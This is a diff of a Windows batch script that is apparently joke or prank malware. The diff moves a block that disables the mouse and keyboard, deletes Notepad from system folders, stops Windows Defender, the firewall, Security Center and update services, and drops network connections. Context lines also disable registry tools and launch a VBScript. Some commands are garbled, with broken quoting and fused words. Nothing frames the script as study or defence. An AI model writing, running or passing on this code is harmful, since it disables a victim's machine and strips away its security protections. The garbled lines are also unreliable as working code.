@@ -500,27 +500,6 @@ echo My YouTube channel: youtube.com/danooct1 >> note.txt
 echo My email: danooct1press@gmail.com >> note.txt
 echo Twitter: twitter.com/danooct1 >> note.txt
 echo And please note that I will ban you if you spam. >> note.txt
-goto DisableEverything
-
-:DisableEverything
-rundll32 mouse,disable
-rundll32 keyboard,disable
-del C:\WINDOWS\SYSTEM32\notepad.exe
-del C:\WINDOWS\notepad.exe
-del C:\WINDOWS\SYSWOW64\notepad.exe
-net stop "WSearch"
-net stopTextbox2.textwuauserv"
-net stop"WinDefend"
-taskkill /f /t /im "MSASCui.exe"
-if %errorlevel%==1 tskill MSASCui
-net stop"MpsSvc"
-taskkill /f /t /im"FirewallControlPanel.exe"
-if %errorlevel%==1 tskill FirewallControlPanel
-netsh firewall set opmode mode=disable
-net stop "Security Center"
-net stop "WerSvc"
-net stop "WPCSvc"
-net stop "SDRSVC"
 goto ThrowTheComputerToTrash
 
 :ThrowTheComputerToTrash
@@ -662,5 +641,26 @@ reg DELETE "HKCU\Software\Orange Group"
 reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
 ping -n 15 127.0.0.1>nul
 start CounterPoopFuker.vbs
+goto DisableEverything
+
+:DisableEverything
+rundll32 mouse,disable
+rundll32 keyboard,disable
+del C:\WINDOWS\SYSTEM32\notepad.exe
+del C:\WINDOWS\notepad.exe
+del C:\WINDOWS\SYSWOW64\notepad.exe
+net stop "WSearch"
+net stopTextbox2.textwuauserv"
+net stop"WinDefend"
+taskkill /f /t /im "MSASCui.exe"
+if %errorlevel%==1 tskill MSASCui
+net stop"MpsSvc"
+taskkill /f /t /im"FirewallControlPanel.exe"
+if %errorlevel%==1 tskill FirewallControlPanel
+netsh firewall set opmode mode=disable
+net stop "Security Center"
+net stop "WerSvc"
+net stop "WPCSvc"
+net stop "SDRSVC"
 ipconfig /release + vbnewlineif %ERRORLEVEL%==1 ipconfig /release_all
 exit
